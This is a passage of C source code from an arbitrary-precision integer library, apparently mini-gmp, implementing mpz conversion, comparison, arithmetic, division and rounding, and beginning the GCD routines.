    r->_mp_d = gmp_xalloc_limbs (rn);
}

void
mpz_clear (mpz_t r)
{
    if (r->_mp_alloc)
        gmp_free (r->_mp_d);
}

static mp_ptr
mpz_realloc (mpz_t r, mp_size_t size)
{
    size = GMP_MAX (size, 1);

    if (r->_mp_alloc)
        r->_mp_d = gmp_xrealloc_limbs (r->_mp_d, size);
    else
        r->_mp_d = gmp_xalloc_limbs (size);
    r->_mp_alloc = size;

    if (GMP_ABS (r->_mp_size) > size)
        r->_mp_size = 0;

    return r->_mp_d;
}

/* Realloc for an mpz_t WHAT if it has less than NEEDED limbs.  */
#define MPZ_REALLOC(z,n) ((n) > (z)->_mp_alloc			\
			  ? mpz_realloc(z,n)			\
			  : (z)->_mp_d)

/* MPZ assignment and basic conversions. */
void
mpz_set_si (mpz_t r, int64_t x)
{
    if (x >= 0)
        mpz_set_ui (r, x);
    else /* (x < 0) */
    {
        r->_mp_size = -1;
        MPZ_REALLOC (r, 1)[0] = GMP_NEG_CAST (uint64_t, x);
    }
}

void
mpz_set_ui (mpz_t r, uint64_t x)
{
    if (x > 0)
    {
        r->_mp_size = 1;
        MPZ_REALLOC (r, 1)[0] = x;
    }
    else
        r->_mp_size = 0;
}

void
mpz_set (mpz_t r, const mpz_t x)
{
    /* Allow the NOP r == x */
    if (r != x)
    {
        mp_size_t n;
        mp_ptr rp;

        n = GMP_ABS (x->_mp_size);
        rp = MPZ_REALLOC (r, n);

        mpn_copyi (rp, x->_mp_d, n);
        r->_mp_size = x->_mp_size;
    }
}

void
mpz_init_set_si (mpz_t r, int64_t x)
{
    mpz_init (r);
    mpz_set_si (r, x);
}

void
mpz_init_set_ui (mpz_t r, uint64_t x)
{
    mpz_init (r);
    mpz_set_ui (r, x);
}

void
mpz_init_set (mpz_t r, const mpz_t x)
{
    mpz_init (r);
    mpz_set (r, x);
}

int
mpz_fits_slong_p (const mpz_t u)
{
    mp_size_t us = u->_mp_size;

    if (us == 1)
        return u->_mp_d[0] < GMP_LIMB_HIGHBIT;
    else if (us == -1)
        return u->_mp_d[0] <= GMP_LIMB_HIGHBIT;
    else
        return (us == 0);
}

int
mpz_fits_ulong_p (const mpz_t u)
{
    mp_size_t us = u->_mp_size;

    return (us == (us > 0));
}

int64_t
mpz_get_si (const mpz_t u)
{
    mp_size_t us = u->_mp_size;

    if (us > 0)
        return (long) (u->_mp_d[0] & ~GMP_LIMB_HIGHBIT);
    else if (us < 0)
        return (long) (- u->_mp_d[0] | GMP_LIMB_HIGHBIT);
    else
        return 0;
}

uint64_t
mpz_get_ui (const mpz_t u)
{
    return u->_mp_size == 0 ? 0 : u->_mp_d[0];
}

size_t
mpz_size (const mpz_t u)
{
    return GMP_ABS (u->_mp_size);
}

mp_limb_t
mpz_getlimbn (const mpz_t u, mp_size_t n)
{
    if (n >= 0 && n < GMP_ABS (u->_mp_size))
        return u->_mp_d[n];
    else
        return 0;
}

void
mpz_realloc2 (mpz_t x, mp_bitcnt_t n)
{
    mpz_realloc (x, 1 + (n - (n != 0)) / GMP_LIMB_BITS);
}

mp_srcptr
mpz_limbs_read (mpz_srcptr x)
{
    return x->_mp_d;;
}

mp_ptr
mpz_limbs_modify (mpz_t x, mp_size_t n)
{
    assert (n > 0);
    return MPZ_REALLOC (x, n);
}

mp_ptr
mpz_limbs_write (mpz_t x, mp_size_t n)
{
    return mpz_limbs_modify (x, n);
}

void
mpz_limbs_finish (mpz_t x, mp_size_t xs)
{
    mp_size_t xn;
    xn = mpn_normalized_size (x->_mp_d, GMP_ABS (xs));
    x->_mp_size = xs < 0 ? -xn : xn;
}

mpz_srcptr
mpz_roinit_n (mpz_t x, mp_srcptr xp, mp_size_t xs)
{
    x->_mp_alloc = 0;
    x->_mp_d = (mp_ptr) xp;
    mpz_limbs_finish (x, xs);
    return x;
}


/* Conversions and comparison to double. */
void
mpz_set_d (mpz_t r, double x)
{
    int sign;
    mp_ptr rp;
    mp_size_t rn, i;
    double B;
    double Bi;
    mp_limb_t f;

    /* x != x is true when x is a NaN, and x == x * 0.5 is true when x is
       zero or infinity. */
    if (x != x || x == x * 0.5)
    {
        r->_mp_size = 0;
        return;
    }

    sign = x < 0.0 ;
    if (sign)
        x = - x;

    if (x < 1.0)
    {
        r->_mp_size = 0;
        return;
    }
    B = 2.0 * (double) GMP_LIMB_HIGHBIT;
    Bi = 1.0 / B;
    for (rn = 1; x >= B; rn++)
        x *= Bi;

    rp = MPZ_REALLOC (r, rn);

    f = (mp_limb_t) x;
    x -= f;
    assert (x < 1.0);
    i = rn-1;
    rp[i] = f;
    while (--i >= 0)
    {
        x = B * x;
        f = (mp_limb_t) x;
        x -= f;
        assert (x < 1.0);
        rp[i] = f;
    }

    r->_mp_size = sign ? - rn : rn;
}

void
mpz_init_set_d (mpz_t r, double x)
{
    mpz_init (r);
    mpz_set_d (r, x);
}

double
mpz_get_d (const mpz_t u)
{
    mp_size_t un;
    double x;
    double B = 2.0 * (double) GMP_LIMB_HIGHBIT;

    un = GMP_ABS (u->_mp_size);

    if (un == 0)
        return 0.0;

    x = u->_mp_d[--un];
    while (un > 0)
        x = B*x + u->_mp_d[--un];

    if (u->_mp_size < 0)
        x = -x;

    return x;
}

int
mpz_cmpabs_d (const mpz_t x, double d)
{
    mp_size_t xn;
    double B, Bi;
    mp_size_t i;

    xn = x->_mp_size;
    d = GMP_ABS (d);

    if (xn != 0)
    {
        xn = GMP_ABS (xn);

        B = 2.0 * (double) GMP_LIMB_HIGHBIT;
        Bi = 1.0 / B;

        /* Scale d so it can be compared with the top limb. */
        for (i = 1; i < xn; i++)
            d *= Bi;

        if (d >= B)
            return -1;

        /* Compare floor(d) to top limb, subtract and cancel when equal. */
        for (i = xn; i-- > 0;)
        {
            mp_limb_t f, xl;

            f = (mp_limb_t) d;
            xl = x->_mp_d[i];
            if (xl > f)
                return 1;
            else if (xl < f)
                return -1;
            d = B * (d - f);
        }
    }
    return - (d > 0.0);
}

int
mpz_cmp_d (const mpz_t x, double d)
{
    if (x->_mp_size < 0)
    {
        if (d >= 0.0)
            return -1;
        else
            return -mpz_cmpabs_d (x, d);
    }
    else
    {
        if (d < 0.0)
            return 1;
        else
            return mpz_cmpabs_d (x, d);
    }
}


/* MPZ comparisons and the like. */
int
mpz_sgn (const mpz_t u)
{
    mp_size_t usize = u->_mp_size;

    return (usize > 0) - (usize < 0);
}

int
mpz_cmp_si (const mpz_t u, long v)
{
    mp_size_t usize = u->_mp_size;

    if (usize < -1)
        return -1;
    else if (v >= 0)
        return mpz_cmp_ui (u, v);
    else if (usize >= 0)
        return 1;
    else /* usize == -1 */
    {
        mp_limb_t ul = u->_mp_d[0];
        if ((mp_limb_t)GMP_NEG_CAST (uint64_t, v) < ul)
            return -1;
        else
            return (mp_limb_t)GMP_NEG_CAST (uint64_t, v) > ul;
    }
}

int
mpz_cmp_ui (const mpz_t u, uint64_t v)
{
    mp_size_t usize = u->_mp_size;

    if (usize > 1)
        return 1;
    else if (usize < 0)
        return -1;
    else
    {
        mp_limb_t ul = (usize > 0) ? u->_mp_d[0] : 0;
        return (ul > v) - (ul < v);
    }
}

int
mpz_cmp (const mpz_t a, const mpz_t b)
{
    mp_size_t asize = a->_mp_size;
    mp_size_t bsize = b->_mp_size;

    if (asize != bsize)
        return (asize < bsize) ? -1 : 1;
    else if (asize >= 0)
        return mpn_cmp (a->_mp_d, b->_mp_d, asize);
    else
        return mpn_cmp (b->_mp_d, a->_mp_d, -asize);
}

int
mpz_cmpabs_ui (const mpz_t u, uint64_t v)
{
    mp_size_t un = GMP_ABS (u->_mp_size);
    mp_limb_t ul;

    if (un > 1)
        return 1;

    ul = (un == 1) ? u->_mp_d[0] : 0;

    return (ul > v) - (ul < v);
}

int
mpz_cmpabs (const mpz_t u, const mpz_t v)
{
    return mpn_cmp4 (u->_mp_d, GMP_ABS (u->_mp_size),
                     v->_mp_d, GMP_ABS (v->_mp_size));
}

void
mpz_abs (mpz_t r, const mpz_t u)
{
    mpz_set (r, u);
    r->_mp_size = GMP_ABS (r->_mp_size);
}

void
mpz_neg (mpz_t r, const mpz_t u)
{
    mpz_set (r, u);
    r->_mp_size = -r->_mp_size;
}

void
mpz_swap (mpz_t u, mpz_t v)
{
    MP_SIZE_T_SWAP (u->_mp_size, v->_mp_size);
    MP_SIZE_T_SWAP (u->_mp_alloc, v->_mp_alloc);
    MP_PTR_SWAP (u->_mp_d, v->_mp_d);
}


/* MPZ addition and subtraction */

/* Adds to the absolute value. Returns new size, but doesn't store it. */
static mp_size_t
mpz_abs_add_ui (mpz_t r, const mpz_t a, uint64_t b)
{
    mp_size_t an;
    mp_ptr rp;
    mp_limb_t cy;

    an = GMP_ABS (a->_mp_size);
    if (an == 0)
    {
        MPZ_REALLOC (r, 1)[0] = b;
        return b > 0;
    }

    rp = MPZ_REALLOC (r, an + 1);

    cy = mpn_add_1 (rp, a->_mp_d, an, b);
    rp[an] = cy;
    an += cy;

    return an;
}

/* Subtract from the absolute value. Returns new size, (or -1 on underflow),
   but doesn't store it. */
static mp_size_t
mpz_abs_sub_ui (mpz_t r, const mpz_t a, uint64_t b)
{
    mp_size_t an = GMP_ABS (a->_mp_size);
    mp_ptr rp;

    if (an == 0)
    {
        MPZ_REALLOC (r, 1)[0] = b;
        return -(b > 0);
    }
    rp = MPZ_REALLOC (r, an);
    if (an == 1 && a->_mp_d[0] < b)
    {
        rp[0] = b - a->_mp_d[0];
        return -1;
    }
    else
    {
        gmp_assert_nocarry (mpn_sub_1 (rp, a->_mp_d, an, b));
        return mpn_normalized_size (rp, an);
    }
}

void
mpz_add_ui (mpz_t r, const mpz_t a, uint64_t b)
{
    if (a->_mp_size >= 0)
        r->_mp_size = mpz_abs_add_ui (r, a, b);
    else
        r->_mp_size = -mpz_abs_sub_ui (r, a, b);
}

void
mpz_sub_ui (mpz_t r, const mpz_t a, uint64_t b)
{
    if (a->_mp_size < 0)
        r->_mp_size = -mpz_abs_add_ui (r, a, b);
    else
        r->_mp_size = mpz_abs_sub_ui (r, a, b);
}

void
mpz_ui_sub (mpz_t r, uint64_t a, const mpz_t b)
{
    if (b->_mp_size < 0)
        r->_mp_size = mpz_abs_add_ui (r, b, a);
    else
        r->_mp_size = -mpz_abs_sub_ui (r, b, a);
}

static mp_size_t
mpz_abs_add (mpz_t r, const mpz_t a, const mpz_t b)
{
    mp_size_t an = GMP_ABS (a->_mp_size);
    mp_size_t bn = GMP_ABS (b->_mp_size);
    mp_ptr rp;
    mp_limb_t cy;

    if (an < bn)
    {
        MPZ_SRCPTR_SWAP (a, b);
        MP_SIZE_T_SWAP (an, bn);
    }

    rp = MPZ_REALLOC (r, an + 1);
    cy = mpn_add (rp, a->_mp_d, an, b->_mp_d, bn);

    rp[an] = cy;

    return an + cy;
}

static mp_size_t
mpz_abs_sub (mpz_t r, const mpz_t a, const mpz_t b)
{
    mp_size_t an = GMP_ABS (a->_mp_size);
    mp_size_t bn = GMP_ABS (b->_mp_size);
    int cmp;
    mp_ptr rp;

    cmp = mpn_cmp4 (a->_mp_d, an, b->_mp_d, bn);
    if (cmp > 0)
    {
        rp = MPZ_REALLOC (r, an);
        gmp_assert_nocarry (mpn_sub (rp, a->_mp_d, an, b->_mp_d, bn));
        return mpn_normalized_size (rp, an);
    }
    else if (cmp < 0)
    {
        rp = MPZ_REALLOC (r, bn);
        gmp_assert_nocarry (mpn_sub (rp, b->_mp_d, bn, a->_mp_d, an));
        return -mpn_normalized_size (rp, bn);
    }
    else
        return 0;
}

void
mpz_add (mpz_t r, const mpz_t a, const mpz_t b)
{
    mp_size_t rn;

    if ( (a->_mp_size ^ b->_mp_size) >= 0)
        rn = mpz_abs_add (r, a, b);
    else
        rn = mpz_abs_sub (r, a, b);

    r->_mp_size = a->_mp_size >= 0 ? rn : - rn;
}

void
mpz_sub (mpz_t r, const mpz_t a, const mpz_t b)
{
    mp_size_t rn;

    if ( (a->_mp_size ^ b->_mp_size) >= 0)
        rn = mpz_abs_sub (r, a, b);
    else
        rn = mpz_abs_add (r, a, b);

    r->_mp_size = a->_mp_size >= 0 ? rn : - rn;
}


/* MPZ multiplication */
void
mpz_mul_si (mpz_t r, const mpz_t u, int64_t v)
{
    if (v < 0)
    {
        mpz_mul_ui (r, u, GMP_NEG_CAST (uint64_t, v));
        mpz_neg (r, r);
    }
    else
        mpz_mul_ui (r, u, (uint64_t) v);
}

void
mpz_mul_ui (mpz_t r, const mpz_t u, uint64_t v)
{
    mp_size_t un, us;
    mp_ptr tp;
    mp_limb_t cy;

    us = u->_mp_size;

    if (us == 0 || v == 0)
    {
        r->_mp_size = 0;
        return;
    }

    un = GMP_ABS (us);

    tp = MPZ_REALLOC (r, un + 1);
    cy = mpn_mul_1 (tp, u->_mp_d, un, v);
    tp[un] = cy;

    un += (cy > 0);
    r->_mp_size = (us < 0) ? - un : un;
}

void
mpz_mul (mpz_t r, const mpz_t u, const mpz_t v)
{
    int sign;
    mp_size_t un, vn, rn;
    mpz_t t;
    mp_ptr tp;

    un = u->_mp_size;
    vn = v->_mp_size;

    if (un == 0 || vn == 0)
    {
        r->_mp_size = 0;
        return;
    }

    sign = (un ^ vn) < 0;

    un = GMP_ABS (un);
    vn = GMP_ABS (vn);

    mpz_init2 (t, (un + vn) * GMP_LIMB_BITS);

    tp = t->_mp_d;
    if (un >= vn)
        mpn_mul (tp, u->_mp_d, un, v->_mp_d, vn);
    else
        mpn_mul (tp, v->_mp_d, vn, u->_mp_d, un);

    rn = un + vn;
    rn -= tp[rn-1] == 0;

    t->_mp_size = sign ? - rn : rn;
    mpz_swap (r, t);
    mpz_clear (t);
}

void
mpz_mul_2exp (mpz_t r, const mpz_t u, mp_bitcnt_t bits)
{
    mp_size_t un, rn;
    mp_size_t limbs;
    unsigned shift;
    mp_ptr rp;

    un = GMP_ABS (u->_mp_size);
    if (un == 0)
    {
        r->_mp_size = 0;
        return;
    }

    limbs = bits / GMP_LIMB_BITS;
    shift = bits % GMP_LIMB_BITS;

    rn = un + limbs + (shift > 0);
    rp = MPZ_REALLOC (r, rn);
    if (shift > 0)
    {
        mp_limb_t cy = mpn_lshift (rp + limbs, u->_mp_d, un, shift);
        rp[rn-1] = cy;
        rn -= (cy == 0);
    }
    else
        mpn_copyd (rp + limbs, u->_mp_d, un);

    mpn_zero (rp, limbs);

    r->_mp_size = (u->_mp_size < 0) ? - rn : rn;
}

void
mpz_addmul_ui (mpz_t r, const mpz_t u, uint64_t v)
{
    mpz_t t;
    mpz_init (t);
    mpz_mul_ui (t, u, v);
    mpz_add (r, r, t);
    mpz_clear (t);
}

void
mpz_submul_ui (mpz_t r, const mpz_t u, uint64_t v)
{
    mpz_t t;
    mpz_init (t);
    mpz_mul_ui (t, u, v);
    mpz_sub (r, r, t);
    mpz_clear (t);
}

void
mpz_addmul (mpz_t r, const mpz_t u, const mpz_t v)
{
    mpz_t t;
    mpz_init (t);
    mpz_mul (t, u, v);
    mpz_add (r, r, t);
    mpz_clear (t);
}

void
mpz_submul (mpz_t r, const mpz_t u, const mpz_t v)
{
    mpz_t t;
    mpz_init (t);
    mpz_mul (t, u, v);
    mpz_sub (r, r, t);
    mpz_clear (t);
}


/* MPZ division */
enum mpz_div_round_mode { GMP_DIV_FLOOR, GMP_DIV_CEIL, GMP_DIV_TRUNC };

/* Allows q or r to be zero. Returns 1 iff remainder is non-zero. */
static int
mpz_div_qr (mpz_t q, mpz_t r,
            const mpz_t n, const mpz_t d, enum mpz_div_round_mode mode)
{
    mp_size_t ns, ds, nn, dn, qs;
    ns = n->_mp_size;
    ds = d->_mp_size;

    if (ds == 0)
        gmp_die("mpz_div_qr: Divide by zero.");

    if (ns == 0)
    {
        if (q)
            q->_mp_size = 0;
        if (r)
            r->_mp_size = 0;
        return 0;
    }

    nn = GMP_ABS (ns);
    dn = GMP_ABS (ds);

    qs = ds ^ ns;

    if (nn < dn)
    {
        if (mode == GMP_DIV_CEIL && qs >= 0)
        {
            /* q = 1, r = n - d */
            if (r)
                mpz_sub (r, n, d);
            if (q)
                mpz_set_ui (q, 1);
        }
        else if (mode == GMP_DIV_FLOOR && qs < 0)
        {
            /* q = -1, r = n + d */
            if (r)
                mpz_add (r, n, d);
            if (q)
                mpz_set_si (q, -1);
        }
        else
        {
            /* q = 0, r = d */
            if (r)
                mpz_set (r, n);
            if (q)
                q->_mp_size = 0;
        }
        return 1;
    }
    else
    {
        mp_ptr np, qp;
        mp_size_t qn, rn;
        mpz_t tq, tr;

        mpz_init_set (tr, n);
        np = tr->_mp_d;

        qn = nn - dn + 1;

        if (q)
        {
            mpz_init2 (tq, qn * GMP_LIMB_BITS);
            qp = tq->_mp_d;
        }
        else
            qp = NULL;

        mpn_div_qr (qp, np, nn, d->_mp_d, dn);

        if (qp)
        {
            qn -= (qp[qn-1] == 0);

            tq->_mp_size = qs < 0 ? -qn : qn;
        }
        rn = mpn_normalized_size (np, dn);
        tr->_mp_size = ns < 0 ? - rn : rn;

        if (mode == GMP_DIV_FLOOR && qs < 0 && rn != 0)
        {
            if (q)
                mpz_sub_ui (tq, tq, 1);
            if (r)
                mpz_add (tr, tr, d);
        }
        else if (mode == GMP_DIV_CEIL && qs >= 0 && rn != 0)
        {
            if (q)
                mpz_add_ui (tq, tq, 1);
            if (r)
                mpz_sub (tr, tr, d);
        }

        if (q)
        {
            mpz_swap (tq, q);
            mpz_clear (tq);
        }
        if (r)
            mpz_swap (tr, r);

        mpz_clear (tr);

        return rn != 0;
    }
}

void
mpz_cdiv_qr (mpz_t q, mpz_t r, const mpz_t n, const mpz_t d)
{
    mpz_div_qr (q, r, n, d, GMP_DIV_CEIL);
}

void
mpz_fdiv_qr (mpz_t q, mpz_t r, const mpz_t n, const mpz_t d)
{
    mpz_div_qr (q, r, n, d, GMP_DIV_FLOOR);
}

void
mpz_tdiv_qr (mpz_t q, mpz_t r, const mpz_t n, const mpz_t d)
{
    mpz_div_qr (q, r, n, d, GMP_DIV_TRUNC);
}

void
mpz_cdiv_q (mpz_t q, const mpz_t n, const mpz_t d)
{
    mpz_div_qr (q, NULL, n, d, GMP_DIV_CEIL);
}

void
mpz_fdiv_q (mpz_t q, const mpz_t n, const mpz_t d)
{
    mpz_div_qr (q, NULL, n, d, GMP_DIV_FLOOR);
}

void
mpz_tdiv_q (mpz_t q, const mpz_t n, const mpz_t d)
{
    mpz_div_qr (q, NULL, n, d, GMP_DIV_TRUNC);
}

void
mpz_cdiv_r (mpz_t r, const mpz_t n, const mpz_t d)
{
    mpz_div_qr (NULL, r, n, d, GMP_DIV_CEIL);
}

void
mpz_fdiv_r (mpz_t r, const mpz_t n, const mpz_t d)
{
    mpz_div_qr (NULL, r, n, d, GMP_DIV_FLOOR);
}

void
mpz_tdiv_r (mpz_t r, const mpz_t n, const mpz_t d)
{
    mpz_div_qr (NULL, r, n, d, GMP_DIV_TRUNC);
}

void
mpz_mod (mpz_t r, const mpz_t n, const mpz_t d)
{
    mpz_div_qr (NULL, r, n, d, d->_mp_size >= 0 ? GMP_DIV_FLOOR : GMP_DIV_CEIL);
}

static void
mpz_div_q_2exp (mpz_t q, const mpz_t u, mp_bitcnt_t bit_index,
                enum mpz_div_round_mode mode)
{
    mp_size_t un, qn;
    mp_size_t limb_cnt;
    mp_ptr qp;
    int adjust;

    un = u->_mp_size;
    if (un == 0)
    {
        q->_mp_size = 0;
        return;
    }
    limb_cnt = bit_index / GMP_LIMB_BITS;
    qn = GMP_ABS (un) - limb_cnt;
    bit_index %= GMP_LIMB_BITS;

    if (mode == ((un > 0) ? GMP_DIV_CEIL : GMP_DIV_FLOOR)) /* un != 0 here. */
        /* Note: Below, the final indexing at limb_cnt is valid because at
           that point we have qn > 0. */
        adjust = (qn <= 0
                  || !mpn_zero_p (u->_mp_d, limb_cnt)
                  || (u->_mp_d[limb_cnt]
                      & (((mp_limb_t) 1 << bit_index) - 1)));
    else
        adjust = 0;

    if (qn <= 0)
        qn = 0;
    else
    {
        qp = MPZ_REALLOC (q, qn);

        if (bit_index != 0)
        {
            mpn_rshift (qp, u->_mp_d + limb_cnt, qn, bit_index);
            qn -= qp[qn - 1] == 0;
        }
        else
        {
            mpn_copyi (qp, u->_mp_d + limb_cnt, qn);
        }
    }

    q->_mp_size = qn;

    if (adjust)
        mpz_add_ui (q, q, 1);
    if (un < 0)
        mpz_neg (q, q);
}

static void
mpz_div_r_2exp (mpz_t r, const mpz_t u, mp_bitcnt_t bit_index,
                enum mpz_div_round_mode mode)
{
    mp_size_t us, un, rn;
    mp_ptr rp;
    mp_limb_t mask;

    us = u->_mp_size;
    if (us == 0 || bit_index == 0)
    {
        r->_mp_size = 0;
        return;
    }
    rn = (bit_index + GMP_LIMB_BITS - 1) / GMP_LIMB_BITS;
    assert (rn > 0);

    rp = MPZ_REALLOC (r, rn);
    un = GMP_ABS (us);

    mask = GMP_LIMB_MAX >> (rn * GMP_LIMB_BITS - bit_index);

    if (rn > un)
    {
        /* Quotient (with truncation) is zero, and remainder is
       non-zero */
        if (mode == ((us > 0) ? GMP_DIV_CEIL : GMP_DIV_FLOOR)) /* us != 0 here. */
        {
            /* Have to negate and sign extend. */
            mp_size_t i;

            gmp_assert_nocarry (! mpn_neg (rp, u->_mp_d, un));
            for (i = un; i < rn - 1; i++)
                rp[i] = GMP_LIMB_MAX;

            rp[rn-1] = mask;
            us = -us;
        }
        else
        {
            /* Just copy */
            if (r != u)
                mpn_copyi (rp, u->_mp_d, un);

            rn = un;
        }
    }
    else
    {
        if (r != u)
            mpn_copyi (rp, u->_mp_d, rn - 1);

        rp[rn-1] = u->_mp_d[rn-1] & mask;

        if (mode == ((us > 0) ? GMP_DIV_CEIL : GMP_DIV_FLOOR)) /* us != 0 here. */
        {
            /* If r != 0, compute 2^{bit_count} - r. */
            mpn_neg (rp, rp, rn);

            rp[rn-1] &= mask;

            /* us is not used for anything else, so we can modify it
               here to indicate flipped sign. */
            us = -us;
        }
    }
    rn = mpn_normalized_size (rp, rn);
    r->_mp_size = us < 0 ? -rn : rn;
}

void
mpz_cdiv_q_2exp (mpz_t r, const mpz_t u, mp_bitcnt_t cnt)
{
    mpz_div_q_2exp (r, u, cnt, GMP_DIV_CEIL);
}

void
mpz_fdiv_q_2exp (mpz_t r, const mpz_t u, mp_bitcnt_t cnt)
{
    mpz_div_q_2exp (r, u, cnt, GMP_DIV_FLOOR);
}

void
mpz_tdiv_q_2exp (mpz_t r, const mpz_t u, mp_bitcnt_t cnt)
{
    mpz_div_q_2exp (r, u, cnt, GMP_DIV_TRUNC);
}

void
mpz_cdiv_r_2exp (mpz_t r, const mpz_t u, mp_bitcnt_t cnt)
{
    mpz_div_r_2exp (r, u, cnt, GMP_DIV_CEIL);
}

void
mpz_fdiv_r_2exp (mpz_t r, const mpz_t u, mp_bitcnt_t cnt)
{
    mpz_div_r_2exp (r, u, cnt, GMP_DIV_FLOOR);
}

void
mpz_tdiv_r_2exp (mpz_t r, const mpz_t u, mp_bitcnt_t cnt)
{
    mpz_div_r_2exp (r, u, cnt, GMP_DIV_TRUNC);
}

void
mpz_divexact (mpz_t q, const mpz_t n, const mpz_t d)
{
    gmp_assert_nocarry (mpz_div_qr (q, NULL, n, d, GMP_DIV_TRUNC));
}

int
mpz_divisible_p (const mpz_t n, const mpz_t d)
{
    return mpz_div_qr (NULL, NULL, n, d, GMP_DIV_TRUNC) == 0;
}

int
mpz_congruent_p (const mpz_t a, const mpz_t b, const mpz_t m)
{
    mpz_t t;
    int res;

    /* a == b (mod 0) iff a == b */
    if (mpz_sgn (m) == 0)
        return (mpz_cmp (a, b) == 0);

    mpz_init (t);
    mpz_sub (t, a, b);
    res = mpz_divisible_p (t, m);
    mpz_clear (t);

    return res;
}

static uint64_t
mpz_div_qr_ui (mpz_t q, mpz_t r,
               const mpz_t n, uint64_t d, enum mpz_div_round_mode mode)
{
    mp_size_t ns, qn;
    mp_ptr qp;
    mp_limb_t rl;
    mp_size_t rs;

    ns = n->_mp_size;
    if (ns == 0)
    {
        if (q)
            q->_mp_size = 0;
        if (r)
            r->_mp_size = 0;
        return 0;
    }

    qn = GMP_ABS (ns);
    if (q)
        qp = MPZ_REALLOC (q, qn);
    else
        qp = NULL;

    rl = mpn_div_qr_1 (qp, n->_mp_d, qn, d);
    assert (rl < d);

    rs = rl > 0;
    rs = (ns < 0) ? -rs : rs;

    if (rl > 0 && ( (mode == GMP_DIV_FLOOR && ns < 0)
                    || (mode == GMP_DIV_CEIL && ns >= 0)))
    {
        if (q)
            gmp_assert_nocarry (mpn_add_1 (qp, qp, qn, 1));
        rl = d - rl;
        rs = -rs;
    }

    if (r)
    {
        MPZ_REALLOC (r, 1)[0] = rl;
        r->_mp_size = rs;
    }
    if (q)
    {
        qn -= (qp[qn-1] == 0);
        assert (qn == 0 || qp[qn-1] > 0);

        q->_mp_size = (ns < 0) ? - qn : qn;
    }

    return rl;
}

uint64_t
mpz_cdiv_qr_ui (mpz_t q, mpz_t r, const mpz_t n, uint64_t d)
{
    return mpz_div_qr_ui (q, r, n, d, GMP_DIV_CEIL);
}

uint64_t
mpz_fdiv_qr_ui (mpz_t q, mpz_t r, const mpz_t n, uint64_t d)
{
    return mpz_div_qr_ui (q, r, n, d, GMP_DIV_FLOOR);
}

uint64_t
mpz_tdiv_qr_ui (mpz_t q, mpz_t r, const mpz_t n, uint64_t d)
{
    return mpz_div_qr_ui (q, r, n, d, GMP_DIV_TRUNC);
}

uint64_t
mpz_cdiv_q_ui (mpz_t q, const mpz_t n, uint64_t d)
{
    return mpz_div_qr_ui (q, NULL, n, d, GMP_DIV_CEIL);
}

uint64_t
mpz_fdiv_q_ui (mpz_t q, const mpz_t n, uint64_t d)
{
    return mpz_div_qr_ui (q, NULL, n, d, GMP_DIV_FLOOR);
}

uint64_t
mpz_tdiv_q_ui (mpz_t q, const mpz_t n, uint64_t d)
{
    return mpz_div_qr_ui (q, NULL, n, d, GMP_DIV_TRUNC);
}

uint64_t
mpz_cdiv_r_ui (mpz_t r, const mpz_t n, uint64_t d)
{
    return mpz_div_qr_ui (NULL, r, n, d, GMP_DIV_CEIL);
}
uint64_t
mpz_fdiv_r_ui (mpz_t r, const mpz_t n, uint64_t d)
{
    return mpz_div_qr_ui (NULL, r, n, d, GMP_DIV_FLOOR);
}
uint64_t
mpz_tdiv_r_ui (mpz_t r, const mpz_t n, uint64_t d)
{
    return mpz_div_qr_ui (NULL, r, n, d, GMP_DIV_TRUNC);
}

uint64_t
mpz_cdiv_ui (const mpz_t n, uint64_t d)
{
    return mpz_div_qr_ui (NULL, NULL, n, d, GMP_DIV_CEIL);
}

uint64_t
mpz_fdiv_ui (const mpz_t n, uint64_t d)
{
    return mpz_div_qr_ui (NULL, NULL, n, d, GMP_DIV_FLOOR);
}

uint64_t
mpz_tdiv_ui (const mpz_t n, uint64_t d)
{
    return mpz_div_qr_ui (NULL, NULL, n, d, GMP_DIV_TRUNC);
}

uint64_t
mpz_mod_ui (mpz_t r, const mpz_t n, uint64_t d)
{
    return mpz_div_qr_ui (NULL, r, n, d, GMP_DIV_FLOOR);
}

void
mpz_divexact_ui (mpz_t q, const mpz_t n, uint64_t d)
{
    gmp_assert_nocarry (mpz_div_qr_ui (q, NULL, n, d, GMP_DIV_TRUNC));
}

int
mpz_divisible_ui_p (const mpz_t n, uint64_t d)
{
    return mpz_div_qr_ui (NULL, NULL, n, d, GMP_DIV_TRUNC) == 0;
}


/* GCD */
static mp_limb_t
mpn_gcd_11 (mp_limb_t u, mp_limb_t v)
{
    unsigned shift;

    assert ( (u | v) > 0);

    if (u == 0)
        return v;
    else if (v == 0)
        return u;

    gmp_ctz (shift, u | v);

    u >>= shift;
    v >>= shift;

    if ( (u & 1) == 0)
        MP_LIMB_T_SWAP (u, v);

    while ( (v & 1) == 0)
        v >>= 1;

    while (u != v)
    {
        if (u > v)
        {
            u -= v;
            do
                u >>= 1;
            while ( (u & 1) == 0);
        }
        else
        {
            v -= u;
            do
                v >>= 1;
            while ( (v & 1) == 0);
        }
    }
    return u << shift;
}

uint64_t
mpz_gcd_ui (mpz_t g, const mpz_t u, uint64_t v)
{
    mp_size_t un;

    if (v == 0)
    {
        if (g)
            mpz_abs (g, u);
    }
    else
    {
        un = GMP_ABS (u->_mp_size);
        if (un != 0)
            v = mpn_gcd_11 (mpn_div_qr_1 (NULL, u->_mp_d, un, v), v);

        if (g)
            mpz_set_ui (g, v);
    }

    return v;
}

static mp_bitcnt_t
mpz_make_odd (mpz_t r)
{
    mp_bitcnt_t shift;

    assert (r->_mp_size > 0);
    /* Count trailing zeros, equivalent to mpn_scan1, because we know that there is a 1 */
    shift = mpn_common_scan (r->_mp_d[0], 0, r->_mp_d, 0, 0);
    mpz_tdiv_q_2exp (r, r, shift);

    return shift;
}

void
mpz_gcd (mpz_t g, const mpz_t u, const mpz_t v)
{
    mpz_t tu, tv;
    mp_bitcnt_t uz, vz, gz;

    if (u->_mp_size == 0)
    {
        mpz_abs (g, v);
        return;
    }
    if (v->_mp_size == 0)
    {
        mpz_abs (g, u);
        return;
    }

    mpz_init (tu);
    mpz_init (tv);

    mpz_abs (tu, u);
    uz = mpz_make_odd (tu);
    mpz_abs (tv, v);
    vz = mpz_make_odd (tv);
    gz = GMP_MIN (uz, vz);

    if (tu->_mp_size < tv->_mp_size)
        mpz_swap (tu, tv);

    mpz_tdiv_r (tu, tu, tv);
    if (tu->_mp_size == 0)
    {
        mpz_swap (g, tv);
    }
    else
        for (;;)
        {
            int c;

            mpz_make_odd (tu);
            c = mpz_cmp (tu, tv);
            if (c == 0)
            {
                mpz_swap (g, tu);
                break;
            }
            if (c < 0)
                mpz_swap (tu, tv);

            if (tv->_mp_size == 1)
            {
                mp_limb_t vl = tv->_mp_d[0];
